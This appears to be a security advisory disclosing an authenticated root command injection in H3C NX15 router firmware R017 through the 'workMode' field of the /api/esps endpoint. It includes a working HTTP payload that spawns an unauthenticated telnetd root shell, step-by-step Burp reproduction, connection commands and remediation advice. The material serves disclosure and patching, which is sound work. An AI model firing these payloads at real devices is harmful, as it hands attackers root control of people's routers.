# H3C NX15 R017 `esps.ipv6.wan.set` `workMode` Authenticated Root Command Injection

## Summary

H3C NX15 Router firmware NX15V100R017 contains an authenticated command injection vulnerability in the `/api/esps` RPC object `esps.ipv6.wan`, method `set`. The `workMode` parameter is used in unsafe shell expressions and later reaches an `eval` assignment, allowing arbitrary command execution as root.

## Vendor and Product

- Vendor: H3C
- Product: NX15 Router
- Affected firmware: NX15V100R017 / R017
- Component: `/api/esps` backend RPC
- Vulnerable object: `esps.ipv6.wan`
- Vulnerable method: `set`
- Vulnerable parameter: `workMode`

## Vulnerability Type

- OS command injection
- Suggested CWE: CWE-78
- Attack vector: Remote
- Authentication required: Yes
- Privileges required: Administrator web session
- User interaction required: No

## Impact

An authenticated attacker can execute arbitrary commands as root. Runtime testing confirmed that a crafted `workMode` value can start a root shell and execute commands with UID 0.

## Technical Details

The backend script reads the JSON value into `param_workMode` and uses it in an unquoted shell test:

```sh
json_get_var param_workMode workMode
if [ ${param_workMode} != "dynamic" ];then
    result=9730
    return_json ${result}
    return
fi
```

The same attacker-controlled value later reaches:

```sh
eval set_workmode${idx}="${param_workMode}"
```

Because `param_workMode` is not safely quoted and later enters `eval`, shell command substitution inside the parameter is executed by the shell. A payload that preserves the expected `dynamic` token while adding command substitution can pass the intended branch behavior and trigger command execution.

The surrounding request flow is:

```text
POST /api/esps
  -> authenticated /www/api /esps handler
  -> lua /usr/lib/lua/protol_cvt.lua magic_link '<request-body>'
  -> /usr/lib/lua/magic_link/magic_link.lua maps object/method/param directly to ubus
  -> esps.ipv6.wan set
```

One subtle point is why a payload such as:

```text
dynamic $(...)
```

can still pass the `dynamic` check. If the command substitution produces no stdout, the shell comparison still effectively behaves like:

```sh
[ dynamic != "dynamic" ]
```

so the code keeps the expected control-flow decision while the command-substitution side effect has already executed. The same attacker-controlled value is then copied again through `eval`.

## Firmware Paths for Audit

The following paths are firmware-internal paths relative to the extracted firmware root filesystem:

- `/www/api`: web API binary that accepts authenticated `/api/esps` requests and forwards them to ubus objects.
- `/usr/lib/lua/protol_cvt.lua`: Lua protocol bridge that decodes the JSON request and issues the ubus call.
- `/usr/lib/lua/magic_link/magic_link.lua`: direct `object/method/param` to `path/func/args` mapping for `/api/esps`.
- `/usr/libexec/rpcd/esps.ipv6.wan`: vulnerable backend script; the `set` branch reads `workMode`, performs an unsafe shell test, and later reaches `eval`.
- `/etc/config/network`: related UCI network configuration file affected by WAN/IPv6 WAN settings.

## Reproduction

Run the included PoC with valid administrator credentials:

```bash
python3 poc/postauth_esps_ipv6_wan_workmode_rce.py \
  --base http://192.168.8.1 \
  --username admin \
  --password '<admin-password>' \
  --port 2323 \
  --cleanup
```

The PoC:

1. Authenticates to the web interface.
2. Calls `/api/esps` with object `esps.ipv6.wan` and method `set`.
3. Sends a crafted `workMode` value containing shell command substitution.
4. Starts a temporary shell service.
5. Connects to the shell and verifies root execution.

Expected result:

```text
uid=0(root)
```

Manual request sequence:

1. Authenticate through `POST /api/login/auth` and capture the `session`.
2. Send:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
Content-Type: application/json
AUTHENTICATION: <session>

[{"id":1,"object":"esps.ipv6.wan","method":"set","param":{"list":[{"intf":"WAN1","workMode":"dynamic $(echo IPV6WAN_RCE_OK >/tmp/ipv6wan_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"}]}}]
```

3. Connect to the temporary listener and run `id`.

BurpSuite step-by-step reproduction:

1. Authenticate in Burp Repeater:

```http
POST /api/login/auth HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
Connection: close

{"username":"admin","password":"admin123"}
```

2. Extract `data.session` and send:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"set","param":{"list":[{"intf":"WAN1","workMode":"dynamic $(echo IPV6WAN_RCE_OK >/tmp/ipv6wan_rce_marker; /usr/sbin/telnetd -p 2323 -l /bin/sh >/dev/null 2>&1 &)"}]}}]
```

3. Wait briefly and connect:

```bash
telnet 192.168.8.1 2323
```

or:

```bash
nc 192.168.8.1 2323
```

4. Run:

```sh
id
uname -a
cat /tmp/ipv6wan_rce_marker
```

5. Optional readback requests:

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"get","param":{"list":["WAN1"]}}]
```

```http
POST /api/esps HTTP/1.1
Host: 192.168.8.1
User-Agent: Mozilla/5.0
Accept: application/json, text/plain, */*
Content-Type: application/json
AUTHENTICATION: <SESSION>
Connection: close

[{"id":1,"object":"esps.ipv6.wan","method":"status","param":{"list":["WAN1"]}}]
```

## Evidence

- `/www/api` and the Lua `magic_link` layer forward authenticated `/api/esps` requests directly into ubus object `esps.ipv6.wan`.
- `/usr/libexec/rpcd/esps.ipv6.wan` first uses `workMode` in an unquoted shell comparison and then copies it through `eval`.
- A payload prefixed with `dynamic ` can preserve the intended branch behavior while executing a command substitution.
- Runtime verification confirmed command execution through the `workMode` parameter, and the spawned shell runs with root privileges.

## Attachments

- Report: `report/postauth_esps_ipv6_wan_workmode_rce_report.md`
- PoC: `poc/postauth_esps_ipv6_wan_workmode_rce.py`

## Remediation

- Quote all shell variables used in test expressions.
- Remove `eval` from the IPv6 WAN backend script.
- Enforce a strict allowlist for `workMode` values.
- Reject any value outside the expected enum before using it in shell logic.
